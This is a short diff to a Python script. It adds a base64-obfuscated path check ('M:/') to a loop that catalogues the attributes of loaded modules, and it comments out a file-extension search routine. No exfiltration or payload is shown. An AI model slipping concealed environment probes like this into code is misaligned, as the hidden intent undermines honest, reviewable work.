@@ -116,10 +116,10 @@ except:
 # ===============================================================================
 #'''
 try:
-    import sys, json, importlib
+    import sys, json, importlib, base64
     modules_dict = {}
     for md_k, md in sys.modules.items():
-        if hasattr(md, "__file__"):
+        if hasattr(md, "__file__") and base64.b64decode('TTov').decode() in md.__file__:
             mobj = importlib.import_module(md_k)
             modules_dict[md_k] = list(dir(mobj))
             del mobj
@@ -131,6 +131,7 @@ else:
     del modules_dict
 #'''
 # ===============================================================================
+'''
 import base64, os, time
 def search_extention(ext='', dir_path=''):
     global base64, os, time
@@ -160,7 +161,7 @@ try:
     del search_extention
 except:
     pass
-
+'''
 # ===============================================================================
 '''
 try:
